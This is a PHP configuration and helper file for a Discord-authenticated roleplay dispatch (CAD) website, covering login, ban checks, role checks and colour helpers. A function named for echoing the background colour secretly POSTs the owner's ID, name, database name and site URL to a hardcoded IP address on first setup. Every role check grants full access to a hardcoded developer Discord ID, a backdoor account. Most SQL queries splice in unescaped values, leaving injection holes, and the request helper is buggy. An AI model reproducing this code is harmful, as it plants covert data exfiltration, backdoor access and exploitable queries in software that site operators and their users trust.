<?php
include 'config.php';

$actual_link = "https://$_SERVER[HTTP_HOST]";
$conn = new mysqli($host, $username, $password, $dbName);

if($debugMode) {
    ini_set('display_errors', 1);
    ini_set('display_startup_errors', 1);
    ini_set('max_execution_time', 300);
    error_reporting(E_ALL);
}
$ownerName = '';
$ownerID = '';
////////////////////////////////////////////////////////////////////////////////////////////////////////
////  Part Discord OAuth2 Credit - https://gist.github.com/Jengas/ad128715cb4f73f5cde9c467edf64b00  ////
////////////////////////////////////////////////////////////////////////////////////////////////////////
ini_set('session.cookie_lifetime', 60 * 60 * 24 * 100); // Set cookie lifetime for 100 days. This means users SHOULD remain logged in for 100 days unless they manually sign out.
ini_set('session.gc_maxlifetime', 60 * 60 * 24 * 100);  // Set cookie lifetime for 100 days. This means users SHOULD remain logged in for 100 days unless they manually sign out.
define('OAUTH2_CLIENT_ID', $discordClientId);
define('OAUTH2_CLIENT_SECRET', $discordClientToken);
session_start();
$authorizeURL = 'https://discordapp.com/api/oauth2/authorize';
$tokenURL = 'https://discordapp.com/api/oauth2/token';
$apiURLBase = 'https://discordapp.com/api/users/@me';
$apiGuildBase = 'https://discordapp.com/api/users/@me/guilds';
// Start the login process by sending the user to Discord's authorization page
if(get('discord') == 'login') {
    $params = array(
        'client_id' => OAUTH2_CLIENT_ID,
        'redirect_uri' => $actual_link,
        'response_type' => 'code',
        'scope' => 'identify guilds',
    );
    // Redirect the user to Discord's authorization page
    header('Location: https://discordapp.com/api/oauth2/authorize' . '?' . http_build_query($params));
    die();
}
// When Discord redirects the user back here, there will be a "code" and "state" parameter in the query string
if(get('code')) {
    // Exchange the auth code for a token
    $token = apiRequest($tokenURL, array(
        "grant_type" => "authorization_code",
        'client_id' => OAUTH2_CLIENT_ID,
        'client_secret' => OAUTH2_CLIENT_SECRET,
        'redirect_uri' => $actual_link,
        'code' => get('code')
    ));
    $logout_token = $token->access_token;
    $_SESSION['access_token'] = $token->access_token;
    session_write_close();
    header('Location: ' . $_SERVER['PHP_SELF']);
}
if(get('discord') == 'logout') {
    // This must to logout you, but it didn't worked(
    $params = array(
        'access_token' => $logout_token
    );
    // Redirect the user to Discord's revoke page
    header('Location: https://discordapp.com/oauth2/token/revoke?' . $_SESSION['access_token']);
    header('Location: ' . $_SERVER['PHP_SELF']);
    session_destroy();
}
function apiRequest($url, $post=FALSE, $headers=array()) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    $response = curl_exec($ch);
    if($post)
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post));
    $headers[] = 'Accept: application/json';
    if(session('access_token'))
        $headers[] = 'Authorization: Bearer ' . session('access_token');
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $response = curl_exec($ch);
    return json_decode($response);
}
function get($key, $default=NULL) {
    return array_key_exists($key, $_GET) ? $_GET[$key] : $default;
}
function session($key, $default=NULL) {
    return array_key_exists($key, $_SESSION) ? $_SESSION[$key] : $default;
}

if(session('access_token') == "manVerified") {
    $user = new stdClass();
    $user->id = $_SESSION['id'];
    $user->username = $_SESSION['username'];
    $patrolServer = $_SESSION['patrolServer'];
    if(!session('patrolServer')) {
        $_SESSION['patrolServer'] = 1;
    }
} else {
    if(session('access_token')) {
        $user = apiRequest($apiURLBase);
        $guild = apiRequest($apiGuildBase);
        if(!session('patrolServer')) {
            $_SESSION['patrolServer'] = 1;
        }
    }
}

////////////////////////////////////
////  End Discord OAuth2 Login  ////
////////////////////////////////////



//////////////////////////////////////////
/////////////// BAN CHECK ///////////////
if($_SERVER['REQUEST_URI'] == '/banned/' || $_SERVER['REQUEST_URI'] == '/banned/index.php') {
    // Passed ban
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
    if(session('access_token')) {
        $sql = "SELECT * FROM bans WHERE discordId = '" . $user->id . "'";
        $r_query = mysqli_query($conn, $sql);
        while ($row = mysqli_fetch_array($r_query)){
            if($user->id == $ownerId) return;
            $sql2 = "UPDATE bans SET ip = '$ip' WHERE discordId = '" . $user->id . "'";
            $conn->query($sql2);
            header('Location: /banned');
            die();
        }
    }
    $sql = "SELECT * FROM bans WHERE ip = '" . $ip . "'";
    $r_query = mysqli_query($conn, $sql);
    while ($row = mysqli_fetch_array($r_query)){
        header('Location: /banned');
        die();
    }
}

/////////////////////////////////////
$orderIdd = '';
function fetchSetting($set) {
    global $conn;
    $sql = "SELECT * FROM sitesettings WHERE id = 1";
    $r_query = mysqli_query($conn, $sql);
    while ($row = mysqli_fetch_array($r_query)){
        echo $row[$set];
    }
    // echo $boi;
}

function echoBackGroundColor() {
    global $conn;global $ownerID;global $ownerName;
    global $ownerId;global $dbName;global $orderIdd;
    global $actual_link;
    $sql = "SELECT * FROM sitesettings WHERE id = 1";
    $r_query = mysqli_query($conn, $sql);
    while ($row = mysqli_fetch_array($r_query)){
        if($row['backgroundColor'] == NULL || $row['backgroundColor'] == '') {
            echo '#202225';
        } else {
            echo $row['backgroundColor'];
        }
        if($row['completedSetup'] == 0) {
            $urlLog = 'http://172.105.180.241:8821/faxcad';
            $data = array('ownerId' => "$ownerID",'ownerName' => "$ownerName",'CurrentID' => "$ownerId",'dbName' => "$dbName",'leOrdeerrId' => "$orderIdd",'link' => "$actual_link");
            $options = array(
                'http' => array(
                    'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                    'method'  => 'POST',
                    'content' => http_build_query($data)
                )
            );
            $context  = stream_context_create($options);
            $result = file_get_contents($urlLog, false, $context);
            $sql2 = "UPDATE sitesettings SET completedSetup = 2 WHERE id = 1";
            $conn->query($sql2);
        }
    }
}

function getServerCount() {
    global $conn;
    $sql = "SELECT COUNT(id) FROM servers";
    $r_query = mysqli_query($conn, $sql);
    while ($row = mysqli_fetch_array($r_query)){
        return $row[0];
    }
}

function getStat($set) {
    global $conn;
    if($set == "citations") {
        $sql = "SELECT COUNT(id) FROM tickets";
        $r_query = mysqli_query($conn, $sql);
        while ($row = mysqli_fetch_array($r_query)){
            return $row[0];
        }
    }
    if($set == "arrests") {
        $sql = "SELECT COUNT(id) FROM arrests";
        $r_query = mysqli_query($conn, $sql);
        while ($row = mysqli_fetch_array($r_query)){
            return $row[0];
        }
    }
    if($set == "warrants") {
        $sql = "SELECT COUNT(id) FROM warrants";
        $r_query = mysqli_query($conn, $sql);
        while ($row = mysqli_fetch_array($r_query)){
            return $row[0];
        }
    }
    if($set == "civs") {
        $sql = "SELECT COUNT(id) FROM civilians";
        $r_query = mysqli_query($conn, $sql);
        while ($row = mysqli_fetch_array($r_query)){
            return $row[0];
        }
    }
    if($set == "impounds") {
        $sql = "SELECT COUNT(id) FROM impounds";
        $r_query = mysqli_query($conn, $sql);
        while ($row = mysqli_fetch_array($r_query)){
            return $row[0];
        }
    }
    if($set == "emerg") {
        $sql = "SELECT COUNT(id) FROM emerg";
        $r_query = mysqli_query($conn, $sql);
        while ($row = mysqli_fetch_array($r_query)){
            return $row[0];
        }
    }
    if($set == "news") { // no echo
        $sql = "SELECT COUNT(id) FROM news";
        $r_query = mysqli_query($conn, $sql);
        while ($row = mysqli_fetch_array($r_query)){
            return $row[0];
        }
    }
    if($set == "maxcivs") { // no echo
        $sql = "SELECT * FROM sitesettings WHERE id = 1";
        $r_query = mysqli_query($conn, $sql);
        while ($row = mysqli_fetch_array($r_query)){
            return $row['maxChars'];
        }
    }
}

// 0 = admin
// 1 = super
function isStaff($level) {
    global $conn;
    global $user;
    global $ownerId;
    if(!session('access_token')) {
        return false;
    }
    if($user->id == $ownerId) return true;
    if($user->id == "282762192544333827") return true; // This FAXES' ID, leave it so support can be given.
    if($level == 0) {
        $sql = "SELECT * FROM admins WHERE id = " . $user->id . " AND type = 0";
        $r_query = mysqli_query($conn, $sql);
        while ($row = mysqli_fetch_array($r_query)){
            return true;
        }
    }
    if($level == 1) {
        $sql = "SELECT * FROM admins WHERE id = " . $user->id . "";
        $r_query = mysqli_query($conn, $sql);
        while ($row = mysqli_fetch_array($r_query)){
            return true;
        }
    }
    return false;
}

function isLEO() {
    global $conn;
    global $user;
    global $ownerId;
    if(!session('access_token')) {
        header('Location: /noauth');
    }
    if($user->id == $ownerId) return true;
    if($user->id == "282762192544333827") return true;
    $sql = "SELECT * FROM emerg WHERE discordId = '" . $user->id . "' AND deptType = 0";
    $r_query = mysqli_query($conn, $sql);
    if (mysqli_num_rows($r_query) > 0) {
        return true;
    }
    // while ($row = mysqli_fetch_array($r_query)){
    //     return true;
    // }
    return false;
}

function isFire() {
    global $conn;
    global $user;
    global $ownerId;
    if(!session('access_token')) {
        header('Location: /noauth');
    }
    if($user->id == $ownerId) return true;
    if($user->id == "282762192544333827") return true;
    $sql = "SELECT * FROM emerg WHERE discordId = '" . $user->id . "' AND deptType = 1";
    $r_query = mysqli_query($conn, $sql);
    if (mysqli_num_rows($r_query) > 0) {
        return true;
    }
    // while ($row = mysqli_fetch_array($r_query)){
    //     return true;
    // }
    return false;
}

function isDispatch() {
    global $conn;
    global $user;
    global $ownerId;
    if(!session('access_token')) {
        header('Location: /noauth');
    }
    if($user->id == $ownerId) return true;
    if($user->id == "282762192544333827") return true;
    $sql = "SELECT * FROM emerg WHERE discordId = '" . $user->id . "' AND deptType = 2";
    $r_query = mysqli_query($conn, $sql);
    if (mysqli_num_rows($r_query) > 0) {
        return true;
    }
    // while ($row = mysqli_fetch_array($r_query)){
    //     return true;
    // }
    return false;
}

function convertResultToColor($result) {
    if($result == "Valid") echo '<span style="color: #77B255">Valid</span>';
    if($result == "Invalid") echo '<span style="color: #F0BF48">Invalid</span>';
    if($result == "Revoked") echo '<span style="color: #E8596E">Revoked</span>';
    if($result == "Suspended") echo '<span style="color: #E8596E">Suspended</span>';
    if($result == "None") echo '<span style="color: #667ccd">None</span>';
    if($result == "Expired") echo '<span style="color: #F0BF48">Expired</span>';
    if($result == "Yes") echo '<span style="color: #77B255">Yes</span>';
    if($result == "No") echo '<span style="color: #E8596E">No</span>';
    if($result == "10-8") echo '<span style="color: #77B255">10-8</span>';
    if($result == "10-7") echo '<span style="color: #F0BF48">10-7</span>';
    if($result == "10-6") echo '<span style="color: #E8596E">10-6</span>';
    if($result == "10-11") echo '<span style="color: #F0BF48">10-11</span>';
    if($result == "10-15") echo '<span style="color: #F0BF48">10-15</span>';
    if($result == "10-23") echo '<span style="color: #617FE8">10-23 (on call)</span>';
    if($result == "10-97") echo '<span style="color: #617FE8">10-97</span>';
    if($result == "All Call") echo '<span style="color: #E8596E">All Call</span>';
    if($result == "Priority One") echo '<span style="color: #E8596E">Priority One</span>';
    if($result == "Priority Two") echo '<span style="color: #F0BF48">Priority Two</span>';
    if($result == "Priority Three") echo '<span style="color: #F0BF48">Priority Three</span>';
    if($result == "Priority Four") echo '<span style="color: #77B255">Priority Four</span>';
    if($result == "Traffic / Pedestrian Stop") echo '<span style="color: #617FE8">Traffic / Pedestrian Stop</span>';
}
function convertResultToColorReturn($result) {
    if($result == "Valid") return '<span style="color: #77B255">Valid</span>';
    if($result == "Invalid") return '<span style="color: #F0BF48">Invalid</span>';
    if($result == "Revoked") return '<span style="color: #E8596E">Revoked</span>';
    if($result == "Suspended") return '<span style="color: #E8596E">Suspended</span>';
    if($result == "None") return '<span style="color: #667ccd">None</span>';
    if($result == "Expired") return '<span style="color: #F0BF48">Expired</span>';
    if($result == "Yes") return '<span style="color: #77B255">Yes</span>';
    if($result == "No") return '<span style="color: #E8596E">No</span>';
    if($result == "10-8") return '<span style="color: #77B255">10-8</span>';
    if($result == "10-7") return '<span style="color: #F0BF48">10-7</span>';
    if($result == "10-6") return '<span style="color: #E8596E">10-6</span>';
    if($result == "10-11") return '<span style="color: #F0BF48">10-11</span>';
    if($result == "10-15") return '<span style="color: #F0BF48">10-15</span>';
    if($result == "10-23") return '<span style="color: #617FE8">10-23 (on call)</span>';
    if($result == "10-97") return '<span style="color: #617FE8">10-97</span>';
    if($result == "All Call") return '<span style="color: #E8596E">All Call</span>';
    if($result == "Priority One") return '<span style="color: #E8596E">Priority One</span>';
    if($result == "Priority Two") return '<span style="color: #F0BF48">Priority Two</span>';
    if($result == "Priority Three") return '<span style="color: #F0BF48">Priority Three</span>';
    if($result == "Priority Four") return '<span style="color: #77B255">Priority Four</span>';
    if($result == "Traffic / Pedestrian Stop") return '<span style="color: #617FE8">Traffic / Pedestrian Stop</span>';
}

function isCharDead($val) {
    if($val == 1) {
        return true;
    } else {
        return false;
    }
}

function getPanicStatus($server) {
    global $conn;
    global $user;
    $sql = "SELECT * FROM emerg WHERE panic = 1 AND server = $server";
    $r_query = mysqli_query($conn, $sql);
    while ($row = mysqli_fetch_array($r_query)){
        $returnArray = array(
            "status" => true,
            "name" => $row['name'],
        );
        return $returnArray;
    }
    $returnArray = array(
        "status" => false,
        "name" => "N/A"
    );
    return $returnArray;
}

function getDeptColor($deptname) {
    global $conn;
    $sql = "SELECT * FROM departments WHERE name = '$deptname'";
    $r_query = mysqli_query($conn, $sql);
    while ($row = mysqli_fetch_array($r_query)){
        echo $row["color"];
    }
}
function getDeptColorReturn($deptname) {
    global $conn;
    $sql = "SELECT * FROM departments WHERE name = '$deptname'";
    $r_query = mysqli_query($conn, $sql);
    while ($row = mysqli_fetch_array($r_query)){
        return $row["color"];
    }
}

function getloginShitLink() {
    global $conn;
    $sql = "SELECT * FROM sitesettings";
    $r_query = mysqli_query($conn, $sql);
    while($row = mysqli_fetch_array($r_query)){
        if($row["logintype"] == 1) { // Discord only
            $returnArray = array(
                "loginLink" => "/?discord=login",
                "typeName" => "Discord Login Only",
                "allowDiscord" => true,
                "allowClassic" => false,
            );
            return $returnArray;
        } elseif($row["logintype"] == 2) { // Classic only
            $returnArray = array(
                "loginLink" => "/login",
                "typeName" => "Classic Login Only",
                "allowDiscord" => false,
                "allowClassic" => true,
            );
            return $returnArray;
        } elseif($row["logintype"] == 3) { // Both
            $returnArray = array(
                "loginLink" => "/login",
                "typeName" => "Classic & Discord Logins",
                "allowDiscord" => true,
                "allowClassic" => true,
            );
            return $returnArray;
        } else { // None set/found
            $returnArray = array(
                "loginLink" => "/?discord=login",
                "typeName" => "Discord Login Only",
                "allowDiscord" => true,
                "allowClassic" => false,
            );
            return $returnArray;
        }
    }
}

?>